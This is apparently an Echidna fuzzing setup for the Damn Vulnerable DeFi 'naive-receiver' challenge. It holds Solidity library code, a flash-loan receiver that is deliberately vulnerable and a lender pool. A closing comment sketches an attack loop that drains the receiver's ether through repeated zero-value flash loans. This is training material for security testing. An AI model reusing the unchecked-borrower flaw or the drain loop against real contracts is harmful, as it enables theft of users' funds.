/code/damn-vulnerable-defi-echidna/contracts/naive-receiver/Address.sol
    | // SPDX-License-Identifier: MIT
    | // OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Collection of functions related to the address type
    |  */
    | library Address {
    |     /**
    |      * @dev Returns true if `account` is a contract.
    |      *
    |      * [IMPORTANT]
    |      * ====
    |      * It is unsafe to assume that an address for which this function returns
    |      * false is an externally-owned account (EOA) and not a contract.
    |      *
    |      * Among others, `isContract` will return false for the following
    |      * types of addresses:
    |      *
    |      *  - an externally-owned account
    |      *  - a contract in construction
    |      *  - an address where a contract will be created
    |      *  - an address where a contract lived, but was destroyed
    |      * ====
    |      *
    |      * [IMPORTANT]
    |      * ====
    |      * You shouldn't rely on `isContract` to protect against flash loan attacks!
    |      *
    |      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
    |      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
    |      * constructor.
    |      * ====
    |      */
*r  |     function isContract(address account) internal view returns (bool) {
    |         // This method relies on extcodesize/address.code.length, which returns 0
    |         // for contracts in construction, since the code is only stored at the end
    |         // of the constructor execution.
    | 
*r  |         return account.code.length > 0;
    |     }
    | 
    |     /**
    |      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
    |      * `recipient`, forwarding all available gas and reverting on errors.
    |      *
    |      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
    |      * of certain opcodes, possibly making contracts go over the 2300 gas limit
    |      * imposed by `transfer`, making them unable to receive funds via
    |      * `transfer`. {sendValue} removes this limitation.
    |      *
    |      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
    |      *
    |      * IMPORTANT: because control is transferred to `recipient`, care must be
    |      * taken to not create reentrancy vulnerabilities. Consider using
    |      * {ReentrancyGuard} or the
    |      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
    |      */
*   |     function sendValue(address payable recipient, uint256 amount) internal {
*   |         require(address(this).balance >= amount, "Address: insufficient balance");
    | 
*   |         (bool success, ) = recipient.call{value: amount}("");
*   |         require(success, "Address: unable to send value, recipient may have reverted");
    |     }
    | 
    |     /**
    |      * @dev Performs a Solidity function call using a low level `call`. A
    |      * plain `call` is an unsafe replacement for a function call: use this
    |      * function instead.
    |      *
    |      * If `target` reverts with a revert reason, it is bubbled up by this
    |      * function (like regular Solidity function calls).
    |      *
    |      * Returns the raw returned data. To convert to the expected return value,
    |      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
    |      *
    |      * Requirements:
    |      *
    |      * - `target` must be a contract.
    |      * - calling `target` with `data` must not revert.
    |      *
    |      * _Available since v3.1._
    |      *
    |     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    |         return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
    |      * `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
    |     function functionCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal returns (bytes memory) {
    |         return functionCallWithValue(target, data, 0, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but also transferring `value` wei to `target`.
    |      *
    |      * Requirements:
    |      *
    |      * - the calling contract must have an ETH balance of at least `value`.
    |      * - the called Solidity function must be `payable`.
    |      *
    |      * _Available since v3.1._
    |      */
*r  |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value
*r  |     ) internal returns (bytes memory) {
*r  |         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
    |      * with `errorMessage` as a fallback revert reason when `target` reverts.
    |      *
    |      * _Available since v3.1._
    |      */
*r  |     function functionCallWithValue(
    |         address target,
    |         bytes memory data,
    |         uint256 value,
    |         string memory errorMessage
*r  |     ) internal returns (bytes memory) {
*r  |         require(address(this).balance >= value, "Address: insufficient balance for call");
*r  |         (bool success, bytes memory returndata) = target.call{value: value}(data);
*r  |         return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
    |         return functionStaticCall(target, data, "Address: low-level static call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a static call.
    |      *
    |      * _Available since v3.3._
    |      */
    |     function functionStaticCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal view returns (bytes memory) {
    |         (bool success, bytes memory returndata) = target.staticcall(data);
    |         return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
    |      * but performing a delegate call.
    |      *
    |      * _Available since v3.4._
    |      */
    |     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
    |         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a delegate call.
    |      *
    |      * _Available since v3.4._
    |      */
    |     function functionDelegateCall(
    |         address target,
    |         bytes memory data,
    |         string memory errorMessage
    |     ) internal returns (bytes memory) {
    |         (bool success, bytes memory returndata) = target.delegatecall(data);
    |         return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    |     }
    | 
    |     /**
    |      * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
    |      * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
    |      *
    |      * _Available since v4.8._
    |      */
*r  |     function verifyCallResultFromTarget(
    |         address target,
    |         bool success,
    |         bytes memory returndata,
    |         string memory errorMessage
*r  |     ) internal view returns (bytes memory) {
*r  |         if (success) {
*   |             if (returndata.length == 0) {
    |                 // only check isContract if the call was successful and the return data is empty
    |                 // otherwise we already know that it was a contract
*   |                 require(isContract(target), "Address: call to non-contract");
    |             }
*   |             return returndata;
    |         } else {
r   |             _revert(returndata, errorMessage);
    |         }
    |     }
    | 
    |     /**
    |      * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
    |      * revert reason or using the provided one.
    |      *
    |      * _Available since v4.3._
    |      */
    |     function verifyCallResult(
    |         bool success,
    |         bytes memory returndata,
    |         string memory errorMessage
    |     ) internal pure returns (bytes memory) {
    |         if (success) {
    |             return returndata;
    |         } else {
    |             _revert(returndata, errorMessage);
    |         }
    |     }
    | 
r   |     function _revert(bytes memory returndata, string memory errorMessage) private pure {
    |         // Look for revert reason and bubble it up if present
r   |         if (returndata.length > 0) {
    |             // The easiest way to bubble the revert reason is using memory via assembly
    |             /// @solidity memory-safe-assembly
    |             assembly {
    |                 let returndata_size := mload(returndata)
    |                 revert(add(32, returndata), returndata_size)
    |             }
    |         } else {
r   |             revert(errorMessage);
    |         }
    |     }
    | }
    | 

/code/damn-vulnerable-defi-echidna/contracts/naive-receiver/FlashLoanReceiver.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./Address.sol";
    | 
    | /**
    |  * @title FlashLoanReceiver
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
*r  |  */
    | contract FlashLoanReceiver {
    |     using Address for address payable;
    | 
    |     address payable private pool;
    | 
    |     constructor(address payable poolAddress)payable {
    |         pool = poolAddress;
    |     }
    | 
    |     // Function called by the pool during flash loan
*r  |     function receiveEther(uint256 fee) public payable {
*r  |         require(msg.sender == pool, "Sender must be pool");
    | 
*   |         uint256 amountToBeRepaid = msg.value + fee;
    | 
*   |         require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
    |         
*   |         _executeActionDuringFlashLoan();
    |         
    |         // Return funds to pool
*   |         pool.sendValue(amountToBeRepaid);
    |     }
    | 
    |     // Internal function where the funds received are used
*   |     function _executeActionDuringFlashLoan() internal { }
    | 
    |     // Allow deposits of ETH
    |     receive () external payable {}
    | }

/code/damn-vulnerable-defi-echidna/contracts/naive-receiver/NaiveReceiverLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "./ReentrancyGuard.sol";
    | import "./Address.sol";
    | 
    | /**
    |  * @title NaiveReceiverLenderPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
*r  |  */
    | contract NaiveReceiverLenderPool is ReentrancyGuard {
    | 
    |     using Address for address;
    | 
*r  |     uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    | 
*   |     function fixedFee() external pure returns (uint256) {
*   |         return FIXED_FEE;
    |     }
    | 
*r  |     function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
    | 
*r  |         uint256 balanceBefore = address(this).balance;
*r  |         require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
    | 
    | 
*r  |         require(borrower.isContract(), "Borrower must be a deployed contract");
    |         // Transfer ETH and handle control to receiver
*r  |         borrower.functionCallWithValue(
*r  |             abi.encodeWithSignature(
    |                 "receiveEther(uint256)",
    |                 FIXED_FEE
    |             ),
*r  |             borrowAmount
    |         );
    |         
*   |         require(
*   |             address(this).balance >= balanceBefore + FIXED_FEE,
    |             "Flash loan hasn't been paid back"
    |         );
    |     }
    | 
    |     // Allow deposits of ETH
    |     receive () external payable {}
    | }
    | 

/code/damn-vulnerable-defi-echidna/contracts/naive-receiver/ReentrancyGuard.sol
    | // SPDX-License-Identifier: MIT
    | // OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Contract module that helps prevent reentrant calls to a function.
    |  *
    |  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
    |  * available, which can be applied to functions to make sure there are no nested
    |  * (reentrant) calls to them.
    |  *
    |  * Note that because there is a single `nonReentrant` guard, functions marked as
    |  * `nonReentrant` may not call one another. This can be worked around by making
    |  * those functions `private`, and then adding `external` `nonReentrant` entry
    |  * points to them.
    |  *
    |  * TIP: If you would like to learn more about reentrancy and alternative ways
    |  * to protect against it, check out our blog post
    |  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
    |  */
    | abstract contract ReentrancyGuard {
    |     // Booleans are more expensive than uint256 or any type that takes up a full
    |     // word because each write operation emits an extra SLOAD to first read the
    |     // slot's contents, replace the bits taken up by the boolean, and then write
    |     // back. This is the compiler's defense against contract upgrades and
    |     // pointer aliasing, and it cannot be disabled.
    | 
    |     // The values being non-zero value makes deployment a bit more expensive,
    |     // but in exchange the refund on every call to nonReentrant will be lower in
    |     // amount. Since refunds are capped to a percentage of the total
    |     // transaction's gas, it is best to keep them low in cases like this one, to
    |     // increase the likelihood of the full refund coming into effect.
*   |     uint256 private constant _NOT_ENTERED = 1;
*r  |     uint256 private constant _ENTERED = 2;
    | 
    |     uint256 private _status;
    | 
    |     constructor() {
    |         _status = _NOT_ENTERED;
    |     }
    | 
    |     /**
    |      * @dev Prevents a contract from calling itself, directly or indirectly.
    |      * Calling a `nonReentrant` function from another `nonReentrant`
    |      * function is not supported. It is possible to prevent this from happening
    |      * by making the `nonReentrant` function external, and making it call a
    |      * `private` function that does the actual work.
    |      */
    |     modifier nonReentrant() {
*r  |         _nonReentrantBefore();
    |         _;
*   |         _nonReentrantAfter();
    |     }
    | 
*r  |     function _nonReentrantBefore() private {
    |         // On the first call to nonReentrant, _status will be _NOT_ENTERED
*r  |         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
    | 
    |         // Any calls to nonReentrant after this point will fail
*r  |         _status = _ENTERED;
    |     }
    | 
*   |     function _nonReentrantAfter() private {
    |         // By storing the original value once again, a refund is triggered (see
    |         // https://eips.ethereum.org/EIPS/eip-2200)
*   |         _status = _NOT_ENTERED;
    |     }
    | }
    | 

/code/damn-vulnerable-defi-echidna/contracts/naive-receiver/navie-attack.sol
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./NaiveReceiverLenderPool.sol";
    | import "./FlashLoanReceiver.sol";
    | import "./Address.sol";
r   | 
    | contract NaiveReceiverEchidna {
    |     using Address for address payable;
    | 
    |     // We will send ETHER_IN_POOL to the flash loan pool.
    |     uint256 constant ETHER_IN_POOL = 1000e18;
    |     // We will send ETHER_IN_RECEIVER to the flash loan receiver.
    |     uint256 constant ETHER_IN_RECEIVER = 10e18;
    | 
    |     NaiveReceiverLenderPool pool;
    |     FlashLoanReceiver receiver;
    | 
    |     // Setup echidna test by deploying the flash loan pool and receiver and sending them some ether.
    |     constructor() payable {
    |         pool = new NaiveReceiverLenderPool();
    |         receiver = new FlashLoanReceiver(payable(address(pool)));
    |         payable(address(pool)).sendValue(ETHER_IN_POOL);
    |         payable(address(receiver)).sendValue(ETHER_IN_RECEIVER);
    |     }
    | 
    |     // We want to test whether the balance of the receiver contract can be decreased.
    |     function echidna_test_contract_balance() public view returns (bool) {
    |         return address(receiver).balance >= 10 ether;
    |     }
    | }
    | /*
    |   SOLUTION 1
    |   WE NEED TO DRAIN ALL THE ETH FROM THE FLASHLOANRECEIVER CONTRACT .INITAIALY THE CONTRACT IS FUNDED WITH 10 ETH AND IT DOES NOT CHECK 
    |   WHETHER THE FLASH LOAN IS CALLED BY THE OWNER OR ATTACKER .SO WE CAN TAKE ADVANTAGE OF THIS AND DRAIN ALL THE ETH FROM THE CONTRACT
    |   SET THE ATTACK CONTRACT CALL THE NAVIEREC FLASH LOAN FUNCTION WITH BORROWER FLASHLOANRECIVER_CONTRACT WE CAN BY PASS THE balanceBefore >= borrowAmount
    |   BY PASSING 0 ETH ,CALL THE FUNCTION UNTIL WE DRAIN THE USER CONTRACT 
    |   function attack(NaiveReceiverLenderPool pool,address payable receiver) public {
    |     uint256 FIXED_FEE = pool.fixedFee();
    |     while (FLACHLOANRECIVER.balance >= FIXED_FEE) {
    |         pool.flashLoan(FLACHLOANRECIVER, 0);
    |     }
    | }
    |   
    |   SOLUTION 2(ONE SHOT)
    |   #### may be correct
    |   THE NAVIEREC FLASH LOAN FUNCTION WITH BORROWER FLASHLOANRECIVER_CONTRACT PASSING 0 ETH ,TRANSFER ALL THE ETH FROM THE 
    |   CONTRACT - 1 (SO THAT IT CAN PAY 1 ETH AS A FEE TO THE FLASHLOAN CONTRACT) TO THE ATTACKER
    |   C:\Users\VISHAL KULKARNI\Desktop\ech-dam-defi\damn-vulnerable-defi-echidna
    | 
    |   docker run -it --rm -v C:\ECH\ECH_PRATICE:/code  trailofbits/eth-security-toolbox
    |   /code/damn-vulnerable-defi-echidna/contracts/naive-receiver
    |   
    |   */
